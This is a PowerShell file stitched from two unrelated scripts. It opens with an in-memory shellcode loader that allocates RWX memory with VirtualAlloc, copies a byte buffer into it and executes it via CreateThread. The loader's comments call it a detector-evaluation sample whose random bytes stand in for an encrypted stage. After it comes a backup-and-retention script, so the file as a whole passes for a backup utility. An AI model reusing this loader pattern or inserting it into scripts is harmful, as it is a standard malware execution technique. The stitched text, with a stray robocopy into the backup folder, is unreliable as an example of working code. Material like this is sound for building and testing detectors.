
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class PlatformApi
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x72, 0xd2, 0x51, 0xbc, 0xd8, 0xc3, 0x5a, 0xfe, 0x89, 0xe1, 0x37, 0x12, 0xa4, 0xee, 0x7a, 0x7d,
        0x6c, 0x45, 0x5f, 0xa6, 0xc8, 0x1a, 0x8d, 0xca, 0x27, 0xba, 0x7c, 0xb4, 0xff, 0x08, 0x82, 0x47,
        0x76, 0x00, 0x2a, 0xd8, 0xf9, 0xcf, 0x5a, 0x4c, 0xf9, 0x50, 0x24, 0x03, 0x34, 0xd1, 0x7c, 0x03,
        0xc0, 0x03, 0x4a, 0xc8, 0x9e, 0x7c, 0x26, 0xf5, 0x78, 0xd7, 0x98, 0x33, 0x7a, 0x11, 0xe4, 0x7c,
        0x7b, 0xf7, 0xd0, 0xed, 0x1b, 0xc5, 0x33, 0x83, 0x73, 0x4a, 0x4f, 0x62, 0xce, 0x21, 0x17, 0x08,
        0xcd, 0xcd, 0xc7, 0x6c, 0x48, 0x5f, 0x38, 0x69, 0x40, 0xbd, 0xd7, 0xf7, 0x7a, 0x93, 0x0e, 0xff,
        0xa4, 0x2e, 0xd5, 0xca, 0x77, 0x54, 0xc5, 0x2a, 0x91, 0x02, 0x37, 0x95, 0x2c, 0xfe, 0x75, 0x01,
        0x46, 0x3c, 0x89, 0x62, 0x0e, 0x3a, 0xe0, 0xdb, 0x05, 0xc0, 0x43, 0x80, 0xc0, 0xbc, 0xef, 0x6f,
        0xc1, 0xc3, 0xea, 0xcc, 0x03, 0xbf, 0x48, 0x56, 0xad, 0x19, 0xe7, 0xe8, 0xf6, 0x78, 0xe9, 0x11,
        0x59, 0x2a, 0xe8, 0xeb, 0x5f, 0x24, 0x1b, 0x0a, 0x48, 0xe3, 0x5b, 0x7d, 0xf8, 0x20, 0xc9, 0x7a,
        0xe5, 0xad, 0x4d, 0x57, 0xaf, 0x10, 0x7d, 0x1f, 0x2f, 0x6e, 0xb6, 0xb4, 0x8e, 0x4a, 0x7a, 0xc3,
        0xeb, 0xf5, 0xbd, 0xd9, 0x74, 0x7d, 0x73, 0x89, 0x84, 0xf3, 0x07, 0x59, 0xc4, 0xb9, 0xfd, 0x0c,
        0x1a, 0x72, 0x2d, 0x50, 0xd3, 0x8c, 0x61, 0x32, 0x70, 0xe0, 0xf5, 0x79, 0xbf, 0x67, 0xe2, 0x17,
        0x94, 0xb9, 0x65, 0x6d, 0x5b, 0x72, 0x40, 0x6c, 0xf4, 0x86, 0xd5, 0xc2, 0xa2, 0x57, 0x2e, 0xd4,
        0xbd, 0xfd, 0x1b, 0x99, 0x69, 0x16, 0xfb, 0x3a, 0x95, 0xbb, 0xd7, 0xbd, 0x4b, 0x7a, 0xb5, 0x36,
        0xf1, 0x07, 0x83, 0x02, 0x3e, 0x0a, 0x06, 0x06, 0xf3, 0xb4, 0x5c, 0x2f
    )

    $Handle = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($Handle -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
    $ThreadId = 0
    $Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][PlatformApi]::WaitForSingleObject($Thread, 2813)
    [void][PlatformApi]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
<#
.SYNOPSIS
    Creates a compressed backup of an application folder and prunes old archives.
.DESCRIPTION
    Builds a timestamped zip archive, verifies its SHA256 hash and applies a
    retention window to the archive folder.
    Only files below the configured backup root are pruned, so a mistyped
    retention value cannot reach outside the archive directory.
.PARAMETER SourcePath
    Paths are resolved relative to the invoking session.
.PARAMETER BackupRoot
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\Start-AppBackup.ps1 -RetentionDays 7
.EXAMPLE
    .\Start-AppBackup.ps1 -BackupRoot D:\Backups\Portal -DryRun
.NOTES
    Author: Platform Engineering
    Last updated: 2026-08-12
#>

[CmdletBinding()]
param(
    [string]$SourcePath = 'C:\Apps\Contoso.Portal',
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$BackupRoot = 'D:\Backups\Portal',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$RetentionDays = 7,

    [ValidateSet("Optimal", 'Fastest', "NoCompression")]
    [string]$CompressionLevel = 'Optimal',

    [int]$MinFreeGB = 10,
    [switch]$DryRun
)

$DebugPreference = 'SilentlyContinue'
$WarningPreference = 'Continue'
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force

$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}

$manifest | ConvertTo-Json -Depth 6 | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8
$probe = Join-Path $env:TEMP ("restore-check-" + $stamp)
Expand-Archive -LiteralPath $archive -DestinationPath $probe -Force
$restored = @(Get-ChildItem -Path $probe -Recurse -File).Count
Write-Host ("Restore check: {0} files recovered" -f $restored)
$staleProbes = Get-ChildItem -Path $env:TEMP -Filter 'restore-check-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-2) }
foreach ($dir in $staleProbes) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}

$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

$stage = Join-Path $env:TEMP ("backup-stage-" + $stamp)
robocopy $SourcePath $stage /E /R:1 /W:2 /NP /NFL /NDL | Out-Null
if ($LASTEXITCODE -ge 8) {
    throw ("Staging copy failed with exit code {0}" -f $LASTEXITCODE)
}
$stageCount = @(Get-ChildItem -Path $stage -Recurse -File).Count
Write-Verbose ("Staged files: {0}" -f $stageCount)

$count = @(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File).Count
$totalGB = [math]::Round((@(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Measure-Object -Property Length -Sum).Sum) / 1GB, 2)
Write-Verbose ("Archive count: {0}, total size: {1} GB" -f $count, $totalGB)
$manifest | Export-Csv -Path (Join-Path $BackupRoot 'backup-history.csv') -NoTypeInformation -Append -Encoding UTF8

$style = @'
<style>
body { font-family: Calibri; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($manifest) | ConvertTo-Html -Title 'Backup summary' -Head $style |
    Set-Content -Path (Join-Path $BackupRoot 'last-backup.html') -Encoding UTF8
Write-Host ("Retention window: {0} days" -f $RetentionDays) -ForegroundColor DarkGray

$MailTo = "backup-ops@internal.corp"
$MailFrom = "backup@internal.corp"
$mailBody = ("Archive: {0}`nSize: {1} MB`nSHA256: {2}" -f $archive, $manifest.SizeMB, $hash.Hash)
$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = 'Backup completed'
    Body       = $mailBody
    SmtpServer = 'smtp.internal.corp'
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams

$oldStages = Get-ChildItem -Path $env:TEMP -Filter 'backup-stage-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddHours(-12) }
foreach ($dir in $oldStages) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host ("Backup finished: {0} files in archive" -f $restored) -ForegroundColor Green

$elapsed = Measure-Command -Expression {
    Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File | Measure-Object -Property Length -Sum
}
Write-Verbose ("Folder scan took {0:N0} ms" -f $elapsed.TotalMilliseconds)

$oldArchives = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Sort-Object -Property LastWriteTime | Select-Object -First 3
$oldArchives | Format-Table Name, LastWriteTime, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$freeSpace = Get-PSDrive -Name ($BackupRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($freeSpace) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($freeSpace.Free / 1GB, 1))
}

$excluded = @('*.tmp', '*.log', '*.bak')
Write-Verbose ("Excluded patterns: {0}" -f ($excluded -join ', '))

$robolog = Join-Path $BackupRoot 'robocopy.log'
robocopy $SourcePath $BackupRoot /E /R:2 /W:5 /NP /LOG:$robolog | Out-Null
if ($LASTEXITCODE -ge 8) {
    Write-Warning ("robocopy reported exit code {0}" -f $LASTEXITCODE)
}

$largeFiles = Get-ChildItem -Path $SourcePath -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { $_.Length -gt 100MB } | Sort-Object Length -Descending | Select-Object -First 5
$largeFiles | ForEach-Object {
    Write-Verbose ("Large file: {0} ({1:N1} MB)" -f $_.Name, ($_.Length / 1MB))
}
